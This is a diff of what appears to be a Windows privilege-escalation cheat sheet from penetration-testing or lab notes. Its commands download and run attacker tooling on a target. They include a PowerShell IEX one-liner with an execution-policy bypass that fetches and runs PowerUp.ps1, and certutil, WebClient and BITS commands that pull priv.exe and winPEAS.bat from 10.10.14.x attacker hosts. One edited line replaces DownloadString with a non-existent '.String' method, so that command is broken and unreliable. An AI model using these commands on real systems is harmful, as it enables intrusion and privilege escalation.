@@ -108,7 +108,7 @@ https://gtfobins.github.io/
 `net use Z: \\127.0.0.1\c$`
 
 ```
-powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).String('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 whoami /priv
 # if SeImpersonatePrivilege is enabled --> juicy/rotten potato
 systeminfo
@@ -161,7 +161,7 @@ start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient
 ### DOWNLOAD FILE CMD/PS
 ```
 certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
-(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/priv.exe', 'C:/inetpub/wwwroot/1.exe') # PS
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.73/winPEAS.bat', 'C:\Users\fsmith\1.bat') # PS
 Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
 $client = New-Object System.Net.WebClient  # two steps is better
 $client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
